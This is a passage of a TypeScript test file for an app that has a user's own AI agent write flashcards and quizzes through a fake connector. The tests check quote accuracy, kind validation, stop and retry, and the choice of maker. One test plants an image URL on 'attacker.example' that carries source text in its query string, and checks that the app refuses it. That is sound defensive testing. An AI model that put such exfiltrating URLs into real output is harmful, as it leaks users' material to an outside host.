/**
 * Flashcards and quizzes made by the person's own agent through the connector
 * (engines/flashcards/agent-maker.ts, engines/quiz/agent-maker.ts,
 * chat/agent/work.ts), with a fake connector whose scripted agent calls
 * Open Sourcebook's tools back through the engine's routes: the checks are the tools'
 * answers, a refused quote is corrected, an unknown kind is refused, Stop
 * stops the turn and keeps what was written, a retry carries on from it, a
 * dropped turn and a gone connector say what they are, and the maker is
 * picked by what is available.
 */
import { beforeEach, describe, expect, it } from "vitest";
import { createNullAssetStore } from "../src/assets";
import { BLOCKS_NOT_ON_A_CARD, type CardSet } from "../src/cards/contract";
import { cardKinds } from "../src/cards/kinds";
import { BLOCK_SHAPES, cardBlockTypes } from "../src/cards/shapes";
import { validateBlock } from "../src/cards/schema";
import { forgetAgentStatus, rememberAgentStatus, AgentWork } from "../src/chat/agent/work";
import { readSkillFile, skills } from "../src/chat/agent/work-skills";
import { createAgentFlashcardsMaker, flashcardTools } from "../src/engines/flashcards/agent-maker";
import { flashcardMakers, createFlashcardsDefinition, upgradeStoredSet } from "../src/engines/flashcards/definition";
import type { FlashcardSettings } from "../src/engines/flashcards/settings";
import { createAgentQuizMaker } from "../src/engines/quiz/agent-maker";
import { createQuizDefinition, type QuizSettings } from "../src/engines/quiz/definition";
import type { QuizPayload } from "../src/engines/quiz/schema";
import { failureCodeOf, failureSaidOf, failureWords, withFailureCode } from "../src/jobs/failure-words";
import { JobFailure } from "../src/jobs/lifecycle";
import { JobWait } from "../src/jobs/waits";
import { InMemoryUsageSink } from "../src/providers/usage";
import { runEngine } from "../src/studio/registry";
import type { EngineCheckpoint, EngineContext, EngineProgress, FormatDefinition, JsonValue, NodeSource } from "../src/studio/types";
import type { SourceEnvelope } from "../src/types";
import { createDefaultRegistry } from "../src/studio/default-registry";
import { handleRequest } from "../src/index";
import { FAKE_CONNECTOR_TOKEN, FAKE_CONNECTOR_URL, FAKE_ENGINE_URL, FakeConnector, type FakeAgent } from "./support/fake-connector";

const P1 = "Heat moves from a warmer body to a cooler one until both reach the same temperature. This flow never runs the other way on its own.";
const P2 = "Conduction carries heat through direct contact, while convection carries it by the movement of a fluid such as air or water.";
const P3 = "Insulators slow conduction because their particles pass on energy poorly, which is why trapped air keeps a house warm.";

function envelope(text: string, title: string): SourceEnvelope {
  return { originalText: text, kind: "text", title, text, references: [], metadata: {}, accessLevel: "full", depthCap: "light", limitations: [], fetchedAt: "2026-11-17T09:00:00.000Z" };
}

function source(): NodeSource {
  const texts = [P1, P2, P3];
  let at = 0;
  const chunks = texts.map((text, index) => {
    const chunk = { id: `chunk-${index + 1}`, ord: index, text, locator: { charStart: at, charEnd: at + text.length } };
    at += text.length + 2;
    return chunk;
  });
  return { sourceId: "src-1", title: "Heat notes", envelope: envelope(texts.join("\n\n"), "Heat notes"), chunks };
}

function memoryCheckpoint(): EngineCheckpoint & { entries: Map<string, JsonValue> } {
  const entries = new Map<string, JsonValue>();
  return { entries, get: (key) => entries.get(key), put: async (key, value) => void entries.set(key, JSON.parse(JSON.stringify(value)) as JsonValue) };
}

function work(connector: FakeConnector, options: { graceMs?: number; maxMissedReads?: number; settleMs?: number } = {}): AgentWork {
  return new AgentWork(
    { url: FAKE_CONNECTOR_URL, token: FAKE_CONNECTOR_TOKEN, agent: "claude", callbackUrl: FAKE_ENGINE_URL, timeoutMs: 180_000 },
    connector.fetch,
    { pollMs: 20, graceMs: options.graceMs ?? 0, settleMs: options.settleMs ?? 300, maxMissedReads: options.maxMissedReads ?? 2, sleep: (ms) => new Promise((resolve) => setTimeout(resolve, Math.min(ms, 5))) },
  );
}

function context<S>(settings: S, options: { checkpoint?: EngineCheckpoint; signal?: AbortSignal; prompt?: string; type?: string } = {}) {
  const progress: EngineProgress[] = [];
  const usage = new InMemoryUsageSink();
  const ctx: EngineContext<S> = {
    jobId: "job-1",
    node: { id: "node-1", type: options.type ?? "flashcards", title: "How heat moves", prompt: options.prompt ?? "Teach how heat moves, for a first look.", settings },
    sources: [source()],
    assumes: [{ nodeId: "n0", outputId: "o0", type: "video", title: "What temperature is", summary: "Temperature is how fast particles move." }],
    inputs: [],
    services: {
      provider: { name: "none", generateJSON: async () => { throw new Error("no model is called"); } },
      assets: createNullAssetStore(),
      usage,
      fetch: async () => new Response(null),
      now: () => "2026-11-17T09:00:00.000Z",
      ...(options.signal ? { signal: options.signal } : {}),
      checkpoint: options.checkpoint ?? memoryCheckpoint(),
      progress: (update) => void progress.push(update),
    },
  };
  return { ctx, progress, usage };
}

const passing = async () => ({ checked: [], failures: [], warnings: [], mediaChecked: 0, chartErrors: [], valid: true });

function setDefinition(connector: FakeConnector, options: { graceMs?: number; maxMissedReads?: number; settleMs?: number } = {}) {
  return createFlashcardsDefinition({ api: false, makers: [createAgentFlashcardsMaker({ work: work(connector, options), verify: passing })] });
}

function cardSettings(raw: Record<string, unknown> = { cards: 2 }): FlashcardSettings {
  const parsed = createFlashcardsDefinition().parseSettings(raw);
  if (!parsed.ok) throw new Error("bad settings");
  return parsed.settings;
}

function quizSettings(raw: Record<string, unknown> = {}): QuizSettings {
  const parsed = createQuizDefinition().parseSettings(raw);
  if (!parsed.ok) throw new Error("bad settings");
  return parsed.settings;
}

const goodCard = (n: number) => ({
  kind: "recall",
  section: "How heat moves",
  front: [{ type: "text", text: `Which way does heat flow between two bodies? (${n})` }],
  back: [{ type: "text", text: "From the warmer to the cooler, until they match." }],
  cites: [{ passage: "P1", quote: "Heat moves from a warmer body to a cooler one", block: 1 }],
});

beforeEach(() => forgetAgentStatus());

describe("a set of flashcards made by the person's agent", () => {
  it("is written card by card through the tools: a wrong quote, an unknown block, a side too big and a card its kind does not fit are refused with what is wrong, then fixed", async () => {
    const answers: Record<string, string> = {};
    const connector = new FakeConnector(async (agent) => {
      expect((await agent.call("outline_sources")).text).toContain("Heat notes");
      expect((await agent.call("read_skill", { path: "notebook" })).text).toContain("Making something a person learns from");
      expect((await agent.call("read_passages", { passages: "P1-P2" })).text).toContain(P2);
      await agent.call("plan_cards", { title: "How heat moves", subtitle: "From warm to cool", parts: [{ title: "How heat moves", cards: 2 }] });
      const wrongQuote = await agent.call("write_card", { ...goodCard(1), cites: [{ passage: "P1", quote: "Heat always moves toward the cold side", block: 1 }] });
      answers.wrongQuote = wrongQuote.text;
      expect(wrongQuote.isError).toBe(true);
      const unknownLabel = await agent.call("write_card", { ...goodCard(1), cites: [{ passage: "P9" }] });
      answers.unknownLabel = unknownLabel.text;
      const unknownBlock = await agent.call("write_card", { ...goodCard(1), front: [{ type: "poem", text: "..." }], cites: [{ passage: "P1" }] });
      answers.unknownBlock = unknownBlock.text;
      const tooBig = await agent.call("write_card", { ...goodCard(1), back: [{ type: "text", text: "word ".repeat(220).trim() }], cites: [{ passage: "P1" }] });
      answers.tooBig = tooBig.text;
      const noBack = await agent.call("write_card", { ...goodCard(1), back: undefined, cites: [{ passage: "P1" }] });
      answers.noBack = noBack.text;
      const unknownKind = await agent.call("write_card", { ...goodCard(1), kind: "poster" });
      answers.unknownKind = unknownKind.text;
      answers.first = (await agent.call("write_card", goodCard(1))).text;
      await agent.call("write_card", { kind: "compare", section: "Two ways it travels", front: [{ type: "text", text: "How do conduction and convection carry heat?" }], back: [{ type: "table", headers: ["Way", "How"], rows: [["Conduction", "Direct contact"], ["Convection", "A moving fluid"]] }], cites: [{ passage: "P2", quote: "Conduction carries heat through direct contact", block: 1 }] });
      answers.readBack = (await agent.call("read_cards")).text;
      answers.finish = (await agent.call("finish_cards")).text;
      return { ok: true };
    });
    const { ctx, progress, usage } = context(cardSettings());
    const result = await runEngine(setDefinition(connector), ctx);

    expect(answers.wrongQuote).toContain("not in passage P1 word for word");
    expect(answers.unknownLabel).toContain('"P9" is not a passage of this item');
    expect(answers.unknownBlock).toContain("Unknown ByteBlock type 'poem'");
    expect(answers.tooBig).toContain("one screen holds 900");
    expect(answers.noBack).toContain("give it a back");
    expect(answers.unknownKind).toContain('"poster" is not a kind of card');
    expect(answers.first).toContain("Kept as c1, card 1 of 1 (about 2 planned), a recall card");
    expect(answers.readBack).toContain('"quote":"Heat moves from a warmer body to a cooler one"');
    expect(answers.finish).toContain("finished and kept");

    expect(result.report.valid).toBe(true);
    const set = result.output.payload as CardSet;
    expect(set.title).toBe("How heat moves");
    expect(set.cards.map((card) => [card.id, card.kind, card.section])).toEqual([
      ["c1", "recall", "How heat moves"],
      ["c2", "compare", "Two ways it travels"],
    ]);
    expect(set.cards[0]!.cites).toEqual([{ sourceId: "src-1", spot: "passage", chunkId: "chunk-1", locator: { charStart: 0, charEnd: P1.length }, quote: "Heat moves from a warmer body to a cooler one", block: 1 }]);
    // The turn: the item's brief, its number of cards, what the plan already covered, and the sources' outline.
    const [turn] = connector.bodies;
    expect(turn!.prompt).toContain("Teach how heat moves, for a first look.");
    expect(turn!.prompt).toContain("Cards: 2, the number the plan set");
    expect(turn!.prompt).toContain('video "What temperature is"');
    expect(turn!.prompt).toContain("P1–P3");
    expect(turn!.callback.url).toBe(`${FAKE_ENGINE_URL}/v1/work-turns/${turn!.turnId}`);
    expect(turn!.target).toEqual({ type: "flashcards", id: "node-1" });
    expect(turn!.timeoutMs).toBe(0);
    // Plain steps on the item while it runs.
    const steps = progress.map((update) => update.step).filter(Boolean);
    expect(steps).toContain("Reading Heat notes");
    expect(steps).toContain("Writing card 1 of 2");
    expect(steps).toContain("Writing card 2 of 2");
    // The person's own agent: one usage row at no cost to Open Sourcebook.
    expect(usage.events).toMatchObject([{ provider: "agent:claude", model: "claude-haiku-test", usd: 0, ok: true }]);
  });

  it("what a card adds beyond its sources is told back, and a background block, which is marked as such, is never cited", async () => {
    const answers: string[] = [];
    const connector = new FakeConnector(async (agent) => {
      answers.push((await agent.call("write_card", { ...goodCard(1), back: [{ type: "text", text: "Heat flows until both match, which is called **thermal equilibrium**, in about 20 minutes." }] })).text);
      answers.push((await agent.call("write_card", { ...goodCard(2), back: [{ type: "text", text: "Heat flows from warmer to cooler." }, { type: "background", text: "Physicists call the end state thermal equilibrium." }], cites: [{ passage: "P1", quote: "Heat moves from a warmer body to a cooler one", block: 2 }] })).text);
      answers.push((await agent.call("write_card", { ...goodCard(2), back: [{ type: "text", text: "Heat flows from warmer to cooler." }, { type: "background", text: "Physicists call the end state thermal equilibrium." }], cites: [{ passage: "P1", quote: "Heat moves from a warmer body to a cooler one", block: 1 }] })).text);
      await agent.call("finish_cards", { title: "Heat" });
      return { ok: true };
    });
    await runEngine(setDefinition(connector), context(cardSettings()).ctx);
    expect(answers[0]).toContain('your sources do not contain 20, "thermal equilibrium"');
    expect(answers[1]).toContain("block 2 is background");
    expect(answers[2]).toContain("Kept as");
    expect(answers[2]).not.toContain("do not contain");
  });

  it("a cite placed on a heading is kept, with a note to place it at the claim", async () => {
    let answer = "";
    const connector = new FakeConnector(async (agent) => {
      answer = (await agent.call("write_card", { ...goodCard(1), front: [{ type: "heading", text: "Heat" }, { type: "text", text: "Which way does heat flow?" }], cites: [{ passage: "P1", quote: "Heat moves from a warmer body to a cooler one", block: 0 }] })).text;
      await agent.call("finish_cards", { title: "Heat" });
      return { ok: true };
    });
    await runEngine(setDefinition(connector), context(cardSettings()).ctx);
    expect(answer).toContain("Kept as c1");
    expect(answer).toContain("name the block that holds the claim");
  });

  it("describes every kind of card and every kind of block from their own lists, and every example fits its shape", () => {
    const write = flashcardTools().find((tool) => tool.name === "write_card")!;
    for (const kind of cardKinds.list()) expect(write.description).toContain(`- ${kind.id} (${kind.label.toLowerCase()})`);
    for (const type of cardBlockTypes()) {
      expect(write.description).toContain(`"type":"${type}"`);
      expect(BLOCK_SHAPES[type], type).toBeDefined();
    }
    for (const type of BLOCKS_NOT_ON_A_CARD) expect(write.description).not.toContain(`"type":"${type}"`);
    for (const [type, shape] of Object.entries(BLOCK_SHAPES)) {
      const errors: Parameters<typeof validateBlock>[2] = [];
      const example = JSON.parse(JSON.stringify(shape.example));
      if (type === "metrics") example.stats[0].id = "s1";
      validateBlock(example, type, errors, 0, { minCards: 1, maxCards: 1 });
      expect(errors, type).toEqual([]);
    }
  });

  it("a picture card shows only a picture Open Sourcebook keeps: a web address is refused in plain words, the source's kept picture is taken", async () => {
    const answers: string[] = [];
    const card = (url: string) => ({ kind: "recall", section: "How heat moves", front: [{ type: "figure", url, caption: "A cup on a table" }, { type: "text", text: "Which way does the heat in this cup flow?" }], back: [{ type: "text", text: "Out of the cup, into the cooler air." }], cites: [{ passage: "P1" }] });
    const connector = new FakeConnector(async (agent) => {
      answers.push((await agent.call("write_card", card("https://attacker.example/p.png?d=Heat%20moves"))).text);
      answers.push((await agent.call("write_card", card("/v1/assets/cup1"))).text);
      await agent.call("finish_cards");
      return { ok: true };
    });
    const { ctx } = context(cardSettings({ cards: 1 }));
    ctx.sources[0]!.envelope.assets = [{ id: "cup1", kind: "image", url: "/v1/assets/cup1", caption: "A cup on a table" }];
    const result = await runEngine(setDefinition(connector), ctx);
    expect(answers[0]).toContain("Not kept.");
    expect(answers[0]).toContain("a picture must be one Open Sourcebook keeps");
    expect(answers[1]).toContain("Kept as c1");
    expect(JSON.stringify(result.output.payload)).not.toContain("attacker.example");
    expect((result.output.payload as CardSet).cards[0]!.front[0]).toMatchObject({ type: "figure", url: "/v1/assets/cup1" });
    // The turn lists the source's kept pictures for the agent to use.
    expect(connector.bodies[0]!.prompt).toContain("url=/v1/assets/cup1");
  });

  it("Stop stops the agent's turn and keeps what was written; a retry carries on from it", async () => {
    const controller = new AbortController();
    const connector = new FakeConnector(async (agent) => {
      await agent.call("plan_cards", { title: "How heat moves", parts: [{ title: "How heat moves", cards: 2 }] });
      await agent.call("write_card", goodCard(1));
      controller.abort(new Error("stopped by the person"));
      return "hang";
    });
    const checkpoint = memoryCheckpoint();
    const definition = setDefinition(connector);
    const first = context(cardSettings(), { checkpoint, signal: controller.signal });
    await expect(runEngine(definition, first.ctx)).rejects.toThrow("stopped by the person");
    expect(connector.stops).toEqual([connector.bodies[0]!.turnId]);
    expect((checkpoint.entries.get("agent:cards") as { cards: unknown[] }).cards).toHaveLength(1);

    connector.setScript(async (agent) => {
      await agent.call("write_card", { ...goodCard(2), section: "And again" });
      await agent.call("finish_cards");
      return { ok: true };
    });
    const second = context(cardSettings(), { checkpoint });
    const result = await runEngine(definition, second.ctx);
    expect(connector.bodies[1]!.turnId).not.toBe(connector.bodies[0]!.turnId);
    expect(connector.bodies[1]!.prompt).toContain("You already wrote 1 card of this set");
    expect((result.output.payload as CardSet).cards.map((card) => [card.id, card.section])).toEqual([["c1", "How heat moves"], ["c2", "And again"]]);
  });

  it("a turn the connector drops waits to be carried on, with what was written kept", async () => {
    let turnId = "";
    const connector = new FakeConnector(async (agent) => {
      turnId = agent.body.turnId;
      await agent.call("write_card", goodCard(1));
      connector.forget(turnId);
      return "hang";
    });
    const checkpoint = memoryCheckpoint();
    const { ctx } = context(cardSettings(), { checkpoint });
    const failure = await runEngine(setDefinition(connector), ctx).catch((error: unknown) => error);
    expect(failure).toBeInstanceOf(JobWait);
    expect(failure).toMatchObject({ reason: "restart", code: "agent_dropped" });
    expect((checkpoint.entries.get("agent:cards") as { cards: unknown[] }).cards).toHaveLength(1);
  });

  describe("the end of a turn does not depend on when it lands", () => {
    const turn = (id: string, run: (agent: FakeAgent) => Promise<void> = async () => undefined, tool = async () => ({ text: "ok" })) => ({
      turnId: id,
      systemPrompt: "s",
      prompt: "p",
      instructions: "i",
      tools: [{ name: "slow", description: "d", inputSchema: { type: "object" as const }, label: () => "Working", run: tool }],
      work: {},
      step: async () => undefined,
      heartbeat: async () => undefined,
      run,
    });

    it("an end that lands after the connector already says the turn is gone still wins", async () => {
      const connector = new FakeConnector(async (agent) => (await agent.call("slow"), { ok: true }));
      connector.finishDelayMs = 120;
      const { run: _run, ...spec } = turn("race-after-gone");
      const end = await work(connector, { graceMs: 0, settleMs: 2_000 }).run(spec);
      expect(end).toMatchObject({ outcome: "done", model: "claude-haiku-test", tokensIn: 100 });
    });

    it("an end that lands before the wait starts is kept", async () => {
      const connector = new FakeConnector(async () => ({ ok: true }));
      const { run: _run, ...spec } = turn("race-before-wait");
      const end = await work(connector).run(spec);
      expect(end).toMatchObject({ outcome: "done", model: "claude-haiku-test" });
    });

    it("an end that lands while a tool call is still being answered is kept, after the call is answered", async () => {
      let answered = false;
      const connector = new FakeConnector(async (agent) => {
        void agent.call("slow");
        await new Promise((resolve) => setTimeout(resolve, 10));
        return { ok: true };
      });
      const { run: _run, ...spec } = turn("race-during-call", undefined, async () => {
        await new Promise((resolve) => setTimeout(resolve, 80));
        answered = true;
        return { text: "ok" };
      });
      const end = await work(connector).run(spec);
      expect(end).toMatchObject({ outcome: "done" });
      expect(answered).toBe(true);
    });

    it("a sleep-sized jump of the clock is not counted against the turn, and a connector that wakes late is asked again", async () => {
      let offset = 0;
      const connector: FakeConnector = new FakeConnector(async () => {
        // The lid closes for two hours: the clock jumps and the connector is not there for a moment on waking.
        connector.reachable = false;
        offset += 2 * 3_600_000;
        await new Promise((resolve) => setTimeout(resolve, 60));
        connector.reachable = true;
        await new Promise((resolve) => setTimeout(resolve, 60));
        return { ok: true };
      });
      const { run: _run, ...spec } = turn("slept");
      const slept = new AgentWork(
        { url: FAKE_CONNECTOR_URL, token: FAKE_CONNECTOR_TOKEN, agent: "claude", callbackUrl: FAKE_ENGINE_URL, timeoutMs: 180_000 },
        connector.fetch,
        { pollMs: 20, graceMs: 0, settleMs: 300, maxMissedReads: 2, sleptAfterMs: 60_000, now: () => Date.now() + offset, sleep: (ms) => new Promise((resolve) => setTimeout(resolve, Math.min(ms, 5))) },
      );
      const end = await slept.run(spec);
      expect(end).toMatchObject({ outcome: "done" });
    });

    it("a turn that really never reports is still said as dropped, once the wait is over", async () => {
      const connector: FakeConnector = new FakeConnector(async (agent): Promise<"hang"> => {
        connector.forget(agent.body.turnId);
        return "hang";
      });
      const { run: _run, ...spec } = turn("race-never");
      const end = await work(connector, { graceMs: 0, settleMs: 100 }).run(spec);
      expect(end).toMatchObject({ outcome: "failed", problem: "dropped" });
    });
  });

  it("a connector that stops answering, or is not there at Start, waits to be carried on as after a restart", async () => {
    const connector = new FakeConnector(async (agent) => {
      await agent.call("outline_sources");
      connector.reachable = false;
      return "hang";
    });
    const gone = await runEngine(setDefinition(connector), context(cardSettings()).ctx).catch((error: unknown) => error);
    expect(gone).toMatchObject({ reason: "restart", code: "agent_unreachable" });

    const never = new FakeConnector(async () => ({ ok: true }));
    never.reachable = false;
    const refused = await runEngine(setDefinition(never), context(cardSettings()).ctx).catch((error: unknown) => error);
    expect(refused).toMatchObject({ reason: "restart", code: "agent_unreachable" });
  });

  it("an agent that ends in an error of its own before any work fails as that, with its own words, for flashcards and a quiz alike; never as a dropped turn", async () => {
    const said = "The 'some-model' model is not supported on this account.";
    const erring = () => new FakeConnector(async () => ({ ok: false, problem: "error", said }));
    const cards = await runEngine(setDefinition(erring()), context(cardSettings()).ctx).catch((error: unknown) => error);
    expect(cards).toBeInstanceOf(JobFailure);
    expect(cards).toMatchObject({ failureCode: "agent_error", said, retryable: false });
    // What the person reads, from the same words a video's agent error gives.
    const read = (error: unknown, thing: string) => failureWords({ state: withFailureCode({}, failureCodeOf(error), failureSaidOf(error)), attempt: 1, status: "failed" }, thing);
    expect(read(cards, "set of flashcards")).toBe(`Your agent stopped before it began on this set of flashcards. It said: "The 'some-model' model is not supported on this account." Fix what it says, then try again.`);

    const quiz = await runEngine(createQuizDefinition({ api: false, makers: [createAgentQuizMaker({ work: work(erring()) })] }), context(quizSettings(), { type: "quiz" }).ctx).catch((error: unknown) => error);
    expect(quiz).toMatchObject({ failureCode: "agent_error", said });
    expect(read(quiz, "quiz")).toBe(`Your agent stopped before it began on this quiz. It said: "The 'some-model' model is not supported on this account." Fix what it says, then try again.`);

    // With no words of its own, it is still said as the agent's own error, with what to check.
    const silent = await runEngine(setDefinition(new FakeConnector(async () => ({ ok: false, problem: "error" }))), context(cardSettings()).ctx).catch((error: unknown) => error);
    expect(read(silent, "set of flashcards")).toBe("Your agent stopped before it began on this set of flashcards. Check that it runs on your computer, then try again.");

    // An error after it did some work is a cut-off turn: it waits and is carried on from what was written.
    const later = new FakeConnector(async (agent) => {
      await agent.call("outline_sources");
      return { ok: false, problem: "error", said };
    });
    expect(await runEngine(setDefinition(later), context(cardSettings()).ctx).catch((error: unknown) => error)).toMatchObject({ reason: "restart", code: "agent_dropped" });
  });

  it("an agent that ends without writing anything fails the item as unfinished", async () => {
    const connector = new FakeConnector(async () => ({ ok: true, text: "I could not." }));
    const failure = await runEngine(setDefinition(connector), context(cardSettings()).ctx).catch((error: unknown) => error);
    expect((failure as JobFailure).failureCode).toBe("agent_dropped");
  });
});

describe("a quiz made by the person's agent", () => {
  const choice = {
    kind: "choice",
    topic: "Direction of heat",
    prompt: "A cold spoon sits in hot soup. Which way does heat flow?",
    options: ["From the soup into the spoon", "From the spoon into the soup", "Both ways equally", "Neither way"],
    answer: 0,
    feedback: { correct: "Heat flows from warmer to cooler.", incorrect: "Heat never flows from cooler to warmer on its own." },
    cites: [{ passage: "P1", quote: "Heat moves from a warmer body to a cooler one" }],
  };

  it("is written question by question: an unknown kind, a disallowed one and a wrong quote are refused, then fixed", async () => {
    const answers: Record<string, string> = {};
    const connector = new FakeConnector(async (agent: FakeAgent) => {
      await agent.call("plan_quiz", { title: "How heat moves", questions: 2 });
      answers.unknown = (await agent.call("write_question", { ...choice, kind: "essay" })).text;
      answers.disallowed = (await agent.call("write_question", { ...choice, kind: "worked", steps: [] })).text;
      answers.wrongQuote = (await agent.call("write_question", { ...choice, cites: [{ passage: "P1", quote: "heat flows toward cold" }] })).text;
      answers.ofTheAbove = (await agent.call("write_question", { ...choice, options: [...choice.options.slice(0, 3), "All of the above"] })).text;
      answers.first = (await agent.call("write_question", choice)).text;
      answers.duplicate = (await agent.call("write_question", choice)).text;
      await agent.call("write_question", {
        ...choice,
        topic: "Ways heat travels",
        prompt: "Warm air rising from a heater carries heat across a room. Which way of carrying heat is that?",
        options: ["Convection", "Conduction", "Insulation", "Evaporation"],
        feedback: { correct: "A moving fluid carries the heat.", incorrect: "Conduction needs direct contact; here the air moves." },
        cites: [{ passage: "P2", quote: "convection carries it by the movement of a fluid" }],
      });
      answers.readBack = (await agent.call("read_quiz")).text;
      answers.finish = (await agent.call("finish_quiz")).text;
      return { ok: true };
    });
    const definition = createQuizDefinition({ api: false, makers: [createAgentQuizMaker({ work: work(connector) })] });
    const { ctx, progress } = context(quizSettings({ kinds: ["choice"] }), { type: "quiz" });
    const result = await runEngine(definition, ctx);

    expect(answers.unknown).toContain('there is no question kind "essay"');
    expect(answers.disallowed).toContain('"worked" is not allowed in this quiz; use choice');
    expect(answers.wrongQuote).toContain("not word for word in P1");
    expect(answers.ofTheAbove).toContain("all/none of the above");
    expect(answers.first).toContain("Kept as q1");
    expect(answers.duplicate).toContain("asks the same as questions[0]");
    expect(answers.finish).toContain("finished and kept");

    expect(result.report.valid).toBe(true);
    const quiz = result.output.payload as QuizPayload;
    expect(quiz.title).toBe("How heat moves");
    expect(quiz.questions.map((question) => question.id)).toEqual(["q1", "q2"]);
    const first = quiz.questions[0]!;
    // Options are in Open Sourcebook's order; the answer moved with them.
    expect((first.options as string[])[first.answer as number]).toBe("From the soup into the spoon");
    expect(first.cites[0]).toMatchObject({ passageId: "chunk-1", chunkId: "chunk-1", quote: "Heat moves from a warmer body to a cooler one" });
    expect(progress.map((update) => update.step)).toContain("Writing question 2 of 2");
  });

  it("is told the time allowed and the real paper's format, and the quiz keeps its time limit", async () => {
    const connector = new FakeConnector(async (agent: FakeAgent) => {
      await agent.call("plan_quiz", { title: "How heat moves", questions: 1 });
      await agent.call("write_question", choice);
      await agent.call("finish_quiz");
      return { ok: true };
    });
    const definition = createQuizDefinition({ api: false, makers: [createAgentQuizMaker({ work: work(connector) })] });
    const { ctx } = context(quizSettings({ kinds: ["choice"], timeLimit: 20, layout: "One part: multiple choice, 2 marks each." }), { type: "quiz" });
    const result = await runEngine(definition, ctx);
    expect(connector.bodies[0]!.prompt).toContain("Format to follow: the person says the real paper is laid out like this:\nOne part: multiple choice, 2 marks each.");
    expect(connector.bodies[0]!.prompt).toContain("Time allowed: 20 minutes from Start");
    expect(connector.bodies[0]!.target).toEqual({ type: "quiz", id: "node-1" });
    expect(result.output.payload).toMatchObject({ timeLimit: 20 });
  });
});

describe("what is made says what it became", () => {
  it("a set much smaller than its plan is finished only with the agent's words on why, which the set keeps and its row shows", async () => {
    const answers: string[] = [];
    const connector = new FakeConnector(async (agent) => {
      await agent.call("plan_cards", { title: "How heat moves", parts: [{ title: "How heat moves", cards: 6 }] });
      await agent.call("write_card", goodCard(1));
      answers.push((await agent.call("finish_cards")).text);
      answers.push((await agent.call("finish_cards", { note: "The notes give one idea, so it is one card." })).text);
      return { ok: true };
    });
    const { ctx } = context(cardSettings());
    const definition = setDefinition(connector);
    const result = await runEngine(definition, ctx);
    expect(answers[0]).toContain("About 6 cards were planned and you wrote 1");
    expect(answers[1]).toContain("finished and kept");
    const set = result.output.payload as CardSet;
    expect(set.sizeNote).toBe("The notes give one idea, so it is one card.");
    expect(definition.describeMade!(set, cardSettings())).toEqual(["Your agent", "1 card"]);
  });

  it("a quiz with fewer questions than planned says so in its own words and in its row's", async () => {
    const answers: string[] = [];
    const connector = new FakeConnector(async (agent) => {
      await agent.call("write_question", {
        kind: "choice", topic: "Direction of heat", prompt: "A cold spoon sits in hot soup. Which way does heat flow?",
        options: ["From the soup into the spoon", "From the spoon into the soup", "Both ways equally", "Neither way"], answer: 0,
        feedback: { correct: "Heat flows from warmer to cooler.", incorrect: "Heat never flows from cooler to warmer on its own." },
        cites: [{ passage: "P1", quote: "Heat moves from a warmer body to a cooler one" }],
      });
      answers.push((await agent.call("finish_quiz", { title: "Heat" })).text);
      answers.push((await agent.call("finish_quiz", { note: "The notes settle one idea worth testing." })).text);
      return { ok: true };
    });
    const definition = createQuizDefinition({ api: false, makers: [createAgentQuizMaker({ work: work(connector) })] });
    const settings = quizSettings({ kinds: ["choice"], questions: 3 });
    const { ctx } = context(settings, { type: "quiz" });
    const result = await runEngine(definition, ctx);
    expect(answers[0]).toContain("The plan said 3 questions and the quiz has 1");
    const quiz = result.output.payload as QuizPayload;
    expect(quiz.sizeNote).toBe("The notes settle one idea worth testing.");
    expect(definition.describeMade!(quiz, settings)[1]).toBe("1 question of 3 planned");
  });
});

describe("which maker makes flashcards or a quiz", () => {
  it("is the person's agent when it is connected, the API key when the agent is not there, and says so when neither is", () => {
    const connector = new FakeConnector(async () => ({ ok: true }));
    const agentWork = work(connector);
    const both = flashcardMakers({ makers: [createAgentFlashcardsMaker({ work: agentWork })] });
    // Nothing heard yet: the agent, first.
    expect(both.default()?.id).toBe("agent");
    rememberAgentStatus(FAKE_CONNECTOR_URL, { reachable: false });
    expect(both.default()?.id).toBe("api");
    expect(both.issues({ ...cardSettings(), maker: "agent" })).toEqual(["your agent makes it, and the connector on this computer isn't running: start it, or pick another maker"]);
    rememberAgentStatus(FAKE_CONNECTOR_URL, { reachable: true, agent: { id: "claude", label: "Claude Code", installed: true, signedIn: true } });
    expect(both.default()?.id).toBe("agent");
    // The engine's setting may prefer the key; the agent is still there to pick.
    expect(flashcardMakers({ makers: [createAgentFlashcardsMaker({ work: agentWork })], defaultMaker: "api" }).default()?.id).toBe("api");

    const definition = createFlashcardsDefinition({ makers: [createAgentFlashcardsMaker({ work: agentWork })] });
    const field = definition.descriptor.settings.find((setting) => setting.key === "maker");
    expect(field && "options" in field ? field.options.map((option) => option.value) : []).toEqual(["auto", "agent", "api"]);
    expect(definition.descriptor.defaults.maker).toBe("auto");

    const onlyAgent = createFlashcardsDefinition({ api: false, makers: [createAgentFlashcardsMaker({ work: agentWork })] });
    expect(onlyAgent.descriptor.settings.some((setting) => setting.key === "maker")).toBe(false);

    const neither = createQuizDefinition({ api: false });
    expect(neither.itemIssues!(quizSettings())).toEqual(["nothing here can make a quiz: connect your agent (start the connector on this computer) or add a model API key"]);
  });

  it("a set with no maker here fails at once, saying what is missing, and never makes a stand-in", async () => {
    const definition = createFlashcardsDefinition({ api: false });
    const failure = await runEngine(definition, context(cardSettings()).ctx).catch((error: unknown) => error);
    expect((failure as JobFailure).failureCode).toBe("no_maker");
  });

  it("the default registry offers the agent alongside the key, and old stored bytes and quizzes still read", async () => {
    const connector = new FakeConnector(async () => ({ ok: true }));
    const registry = createDefaultRegistry({ flashcards: { makers: [createAgentFlashcardsMaker({ work: work(connector) })] }, quiz: { makers: [createAgentQuizMaker({ work: work(connector) })] } });
    expect(registry.require("byte").parseSettings({ depth: "light", maker: "agent" })).toMatchObject({ ok: true, settings: { cards: 8, maker: "agent" } });
    expect(registry.require("byte").descriptor.id).toBe("flashcards");
    expect(registry.require("quiz").parseSettings({ maker: "Not An Id" }).ok).toBe(false);
    // A byte stored as one page (schema 1) is still served, as cards.
    const upgraded = upgradeStoredSet({ id: "6f1d1c2e-9a7b-4c1d-8e2f-3a4b5c6d7e8f", title: "Old", subtitle: "Page", type: "note", tags: [], blocks: [{ type: "text", text: "An old page." }] }, 1);
    expect(upgraded?.schemaVersion).toBe(3);
    expect((upgraded?.payload as CardSet).cards.map((card) => card.kind)).toEqual(["explain"]);
    // A blueprint saved before makers existed is Open Sourcebook's own writer's: a retry of an old job reads it.
    const quiz = registry.require("quiz");
    expect(quiz.repairRoundsFor?.({ title: "Old", targets: [], requested: 0, omittedPassages: 0 } as never)).toBe(2);
  });
});

describe("what an agent sends", () => {
  it("a list sent as JSON text is read as the list, for a quiz's kind fields and a card's sides", async () => {
    const answers: string[] = [];
    const connector = new FakeConnector(async (agent) => {
      answers.push((await agent.call("write_question", {
